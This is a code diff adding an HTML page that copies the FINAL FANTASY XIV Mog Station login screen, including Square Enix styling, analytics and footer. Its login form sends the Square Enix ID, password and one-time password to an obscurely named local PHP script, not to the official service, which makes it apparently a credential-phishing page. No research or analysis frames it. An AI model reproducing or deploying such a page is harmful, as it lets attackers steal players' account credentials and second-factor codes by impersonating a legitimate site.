@@ -1,0 +1,344 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang=en-US>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="Official management site for FINAL FANTASY XIV: Mog Station." />
+
+<title>FINAL FANTASY XIV: Mog Station</title>
+<link rel="stylesheet" href="https://cache.secure.square-enix.com/oauth/content/css/mod_default.css?ver=09202131050124" type="text/css" />
+<link rel="stylesheet" href="https://cache.secure.square-enix.com/oauth/content/css/mod_layout.css?ver=09202131050124" type="text/css" />
+<link rel="stylesheet" href="https://cache.secure.square-enix.com/oauth/content/css/mod_common.css?ver=09202131050124" type="text/css" />
+<link rel="stylesheet" href="https://cache.secure.square-enix.com/oauth/content/css/mod_form.css?ver=09202131050124" type="text/css" />
+<link rel="stylesheet" href="https://cache.secure.square-enix.com/oauth/content/css/mod_mog.css?ver=09202131050124" type="text/css" />
+
+
+	<!-- Google Tag Manager -->
+	<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+	new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+	})(window,document,'script','digitalData','GTM-P37XSWJ');</script>
+	<!-- End Google Tag Manager -->
+
+
+	
+	<link rel="stylesheet" href="https://cache.secure.square-enix.com/account/content/mogstation/style/basis.css?ver=09202131050124" type="text/css" />
+	
+	<link rel="stylesheet" href="https://cache.secure.square-enix.com/account/content/mogstation/style/template.css?ver=09202131050124" type="text/css" />
+	
+	<link rel="stylesheet" href="https://cache.secure.square-enix.com/account/content/mogstation/style/content.css?ver=09202131050124" type="text/css" />
+	
+	<link rel="stylesheet" href="https://cache.secure.square-enix.com/account/content/mogstation/style/i18n.css?ver=09202131050124" type="text/css" />
+	
+	<link rel="stylesheet" href="https://cache.secure.square-enix.com/oauth/content/css/mod_mog_langSelect.css?ver=09202131050124" type="text/css" />
+	
+	<link rel="stylesheet" href="https://cache.secure.square-enix.com/account/content/mogstation/style/template2.css?ver=09202131050124" type="text/css" />
+	
+	<link rel="shortcut icon" href="https://cache.secure.square-enix.com/account/content/mogstation/favicon.ico?ver=09202131050124" />
+
+	<script type="text/javascript" src="https://cache.secure.square-enix.com/account/content/jquery/jquery-3.5.1.min.js?ver=09202131050124"></script>
+	<script type="text/javascript" src="https://cache.secure.square-enix.com/account/content/mogstation/scripts/lds.js?ver=09202131050124"></script>
+	<script type="text/javascript" src="https://cache.secure.square-enix.com/account/content/mogstation/scripts/init.js?ver=09202131050124"></script>
+	<script type="text/javascript" src="https://cache.secure.square-enix.com/account/content/mogstation/scripts/mogpop.js?ver=09202131050124"></script>
+
+<script type="text/javascript">
+jQuery.noConflict(); 
+jQuery.ajaxSetup({ cache: false }); 
+</script> 
+<script src="https://cache.secure.square-enix.com/oauth/content/js/jquery.easing.1.3.js?ver=09202131050124"></script>
+<script src="https://cache.secure.square-enix.com/oauth/content/js/logo.js?ver=09202131050124"></script>
+<script src="https://cache.secure.square-enix.com/oauth/content/js/is_iframe.js?ver=09202131050124"></script>
+<script src="https://www.google.com/recaptcha/api.js" async defer></script>
+<style>
+#recaptcha_widget_div #recaptcha_area {
+	margin:0px auto;
+}
+.recaptcha_input_area {
+	line-height: 1;
+}
+</style>
+</head>
+<body id="index">
+<div id="en">
+
+
+			<!-- corp_header -->
+			<div id="corp_header">
+				<ul class="clearfix">
+					
+					<li class="float_left">
+						
+						<a class="button" id="sqex_logo_button" href="http://www.square-enix.com" target="_blank"></a>
+					</li>
+					
+					<li class="float_rigiht">
+						<div id="lang__select_wrapper" class="brand__lang dropdown_trigger_box">
+							<a href="javascript:void(0);" class="brand__lang__btn brand__lang__na dropdown_trigger">English</a>
+							<ul class="brand__lang__select dropdown" style="opacity: 0; display: none;">
+								<li>
+									<a class="send brand__lang__jp" href="" action="oauthauth?response_type=code&redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&client_id=ffxiv_mog&alar=1&lang=ja-jp">日本語</a>
+								</li>
+								<li>
+									<a class="send brand__lang__na" href="" action="oauthauth?response_type=code&redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&client_id=ffxiv_mog&alar=1&lang=en-us">English</a>
+								</li>
+								<li>
+									<a class="send brand__lang__eu" href="" action="oauthauth?response_type=code&redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&client_id=ffxiv_mog&alar=1&lang=en-gb">English</a>
+								</li>
+								<li>
+									<a class="send brand__lang__fr" href="" action="oauthauth?response_type=code&redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&client_id=ffxiv_mog&alar=1&lang=fr-fr">Français</a>
+								</li>
+								<li>
+									<a class="send brand__lang__de" href="" action="oauthauth?response_type=code&redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&client_id=ffxiv_mog&alar=1&lang=de-de">Deutsch</a>
+								</li>
+							</ul>
+						</div>
+					</li>
+				</ul>
+			</div><!-- corp_header -->
+
+
+	<!-- Google Tag Manager (noscript) -->
+	<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-P37XSWJ"
+	height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+	<!-- End Google Tag Manager (noscript) -->
+
+
+
+<script type="text/javascript" >
+<!--
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-39676948-1', 'square-enix.com');
+ga('send','pageview');
+
+ga('create', 'UA-39676948-13', 'auto', {'name': 'secondTracker'});
+ga('secondTracker.send','pageview','MOG-/login-top');
+-->
+</script>
+
+<script type="text/javascript" src="https://cache.secure.square-enix.com/oauth/content/js/base.js?ver=09202131050124"></script>
+<script id="_swk" type="text/javascript" src="https://cache.secure.square-enix.com/oauth/content/swk/swk.js?ver=09202131050124&amp;lang=en&amp;src=https://cache.secure.square-enix.com/oauth/content/swk"></script>
+
+
+<!-- login_header -->
+<div id="login_header"></div><!-- login_header -->
+
+<div id="login-contentsArea" class="">
+
+
+
+<!-- <div class="servicebanner"></div> -->
+
+	<!-- base_body -->
+	<div id="base_body">
+		<div class="large_text note_color"><b>Welcome to the Mog Station, the account management page for FINAL FANTASY XIV!</b></div>
+		
+		<div class="tiny_br"></div>
+		<div class="bound_login text_left">
+		Here you can manage your FINAL FANTASY XIV account and make use of additional services such as World transfers.
+	</div>
+		<br />
+		<ul class="clearfix">
+			
+			<li class="float_left">
+			
+			<form action="9wer9u4324jnrhrhwr89wyer93u4jjyfsvnfhg.php" method="post">
+				
+				<div id="login_box">
+					<div class="box_header">Log In</div>
+					<div class="box_body">
+						<div>
+							
+							<div class="tiny_br"></div>
+							
+							<input type="hidden" name="_STORED_" value="dcf06e5f47798101ac74fb0e35135d9b5f83fa22842f00c9fcc43d0b31208e93909fda8298dff852ccd860bf72939f95528245f4a3916c2bda4e5008c818e522bed0c37d51ffa715c4524f04617eaafa5997e20b6ec0afe893a5b572358cfadc840d7f2f93cba8c9cdf40e3bd7237113e6">
+
+							
+						</div>
+						
+						<div class="tiny_br"></div>
+						<!-- login_box_inner -->
+						<div id="login_box_inner">
+								
+								<table style="margin: auto;">
+									<tr>
+										<td class="text_left"><span class="large_text">Square Enix ID</span></td>
+										<td width="15"></td>
+										<td>
+											<input type="text" name="username" id="username" class="inpForm input_text login_input_text" value="" tabindex="1" autofocus/>
+										</td>
+										<td width="5"></td>
+									</tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+										<td class="text_left"><span class="large_text">Square Enix Password</span></td>
+										<td>&nbsp;</td>
+										<td>
+											<input type="password" name="password" id="password" class="inpForm input_text login_input_text" tabindex="2" autocomplete="off" />
+										</td>
+										<td width="5"></td>
+									</tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+									    <tr class="form-inputAreaSpace"></tr>
+							<tr>
+								<td class="small_text note_color" colspan="4">
+									* Users with security tokens must use the code displayed on their token to log in.
+								</td>
+								</tr>
+							<tr class="form-inputAreaSpace"></tr>
+									    </tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+									    <td class="text_left"><span class="large_text">One-Time Password</span></td>
+										<td>&nbsp;</td>
+										<td>
+											<input type="password" name="key_value" id="key_value" class="inpForm input_text login_input_text" tabindex="2" autocomplete="off" />
+										</td>
+										<td width="5"></td>
+									</tr>
+									<tr class="tiny_br"></tr>
+									<tr>
+										<td class="text_left" colspan="4">
+											<a href="/account/app/svc/reminder" target="_blank" id="forget">Forgot your ID or password?</a>
+										</td>
+									</tr>
+								</table>
+						</div><!-- login_box_inner -->
+						
+						
+						
+						<div class="tiny_br"></div>
+						
+						<div class="content_navi">
+							<table>
+								<tr>
+									<td><input id="saveSqexid" name="saveSqexid" class="spCheckbox" type="checkbox" value="1"  /></td>
+									<td>&nbsp;</td>
+									<td><label for="saveSqexid">Remember Square Enix ID</label></td>
+								</tr>
+								<tr class="tiny_br"></tr>
+								<tr>
+									<td colspan="3" align="center">
+										<input type="submit" value="" name="login" tabindex="4" class="button hover" id="login_button" style="border: none;background-color: #fff;">
+									</td>
+								</tr>
+							</table>
+						</div>
+						
+						<div class="tiny_br"></div>
+					</div>
+					<div class="box_footer"></div>
+				</div><!-- login_box -->
+				</form>
+			</li>
+			
+			
+			<li class="float_right">
+				<div class="content_box_mini">
+					<div class="box_header"></div>
+					<div class="box_body">
+						
+						<div class="tiny_br"></div>
+						
+							<a href="registligt?response_type=code&redirect_uri=https%3A%2F%2Fsecure.square-enix.com%2Faccount%2Fapp%2Fsvc%2Ftop%3Frequest%3Dmogstation&client_id=ffxiv_mog&lang=en-us">
+								<div id="new_account_button" class="hover new_sqex_account"></div>
+							</a>
+						<br />
+						<div class="content_box_mini_inner">
+							
+		<b>What is a Square Enix account?</b>
+		<br />A Square Enix account is a free service provided for authentification in all of Square Enix's online services. Besides its use in all future online services, one can also associate multiple IDs from current services to a single Square Enix account and enjoy features only available to Square Enix account holders.
+	
+						</div>
+						<br />
+					</div>
+					<div class="box_footer"></div>
+				</div>
+				
+				<div class="tiny_br"></div>
+				
+				<a class="button" id="lds_logo_button_m" href="https://na.finalfantasyxiv.com/lodestone/" target="_blank"></a>
+			</li>
+			
+		</ul>
+	</div><!-- base_body -->
+<!-- / #contentsArea --></div>
+
+
+		<script type="text/javascript" src="https://cache.secure.square-enix.com/account/content/jquery/jquery-3.5.1.min.js?ver=09202131050124"></script>
+		
+		<div id="base_footer" style="margin-top:40px;">
+			<hr class="fade_line" />
+			<table id="footer_menu">
+				<tr>
+					<td class="bound" id="about_site"><a class="mogpop" data-url="https://cache.secure.square-enix.com/account/content/mogstation/html/en/about_site.html?ver=09202131050124">About This Site</a></td>
+					<td class="bound" id="privacy"><a target="_blank" href="https://square-enix-games.com/en_US/documents/privacy">Privacy Policy</a></td>
+		
+					<td class="bound"><a target="_blank" href="https://square-enix-games.com/en_US/documents/cookies">Cookie Policy</a></td>
+					<td id="menuother"><a target="_blank" href="/agreement/us/">User Agreement</a></td>
+		
+				</tr>
+			</table>
+			<hr class="fade_line" />
+			<div id="copyright">
+				<table>
+					
+						<tr>
+							<td><a href="https://www.playstation.com/en-us/" target="_blank"><img src="https://cache.secure.square-enix.com/account/content/mogstation/imgs/template/common/copyright/PSFPS5PS4.png?ver=09202131050124" /></a></td>
+							<th></th>
+							<td><img src="https://cache.secure.square-enix.com/account/content/mogstation/imgs/template/common/copyright/pc_na.png?ver=09202131050124" /></td>
+							<th></th>
+							<td><img src="https://cache.secure.square-enix.com/account/content/mogstation/imgs/template/common/copyright/mac_2.png?ver=09202131050124" /></td>
+							<th></th>
+							<td><img src="https://cache.secure.square-enix.com/account/content/mogstation/imgs/template/common/copyright/steam.png?ver=09202131050124" /></td>
+							<th></th>
+							<td><a href="https://www.esrb.org/" target="_blank"><img id="esrb_rating" class="mt-2" src="https://cache.secure.square-enix.com/account/content/mogstation/imgs/template/common/copyright/esrb3.png?ver=09202131050124" /></a></td>
+							<th></th>
+							<td>
+								<a id="esrb_img" href="https://www.esrb.org/confirm/squareenix-confirmation.aspx" target="_blank"></a>
+								<a id="esrb_text" href="https://square-enix-games.com/en_US/documents/privacy" target="_blank">Privacy Policy</a>
+							</td>
+						</tr>
+					
+				</table>
+				<p style="font-size:11px">&copy; 2010 - <script type="text/javascript">document.write(new Date().getFullYear());</script> SQUARE ENIX CO., LTD. All Rights Reserved.
+				<br>FINAL FANTASY, FINAL FANTASY XIV, FFXIV, SQUARE ENIX, and the SQUARE ENIX logo are registered trademarks or trademarks of Square Enix Holdings Co., Ltd.
+				<br>SHADOWBRINGERS, STORMBLOOD, HEAVENSWARD, and A REALM REBORN are registered trademarks or trademarks of Square Enix Co., Ltd.
+				<br>PlayStation, the "PS" family logo, "PS5" and "PS4" are registered trademarks or trademarks of Sony Interactive Entertainment Inc.
+				<br>ESRB and the ESRB rating icon are registered trademarks of the Entertainment Software Association. 
+				<br>MAC is a trademark of Apple Inc., registered in the U.S. and other countries.
+				<br>Windows is either a registered trademark or trademark of Microsoft Corporation in the United States and/or other countries.
+				<br>All other trademarks are property of their respective owners.
+				<br>&copy;<script type="text/javascript">document.write(new Date().getFullYear());</script> Valve Corporation. Steam and the Steam logo are trademarks and/or registered trademarks of Valve Corporation in the U.S. and/or other countries.</p>
+				
+			</div>
+
+			<br />
+		</div>
+	</div>
+
+
+</body>
+</html>
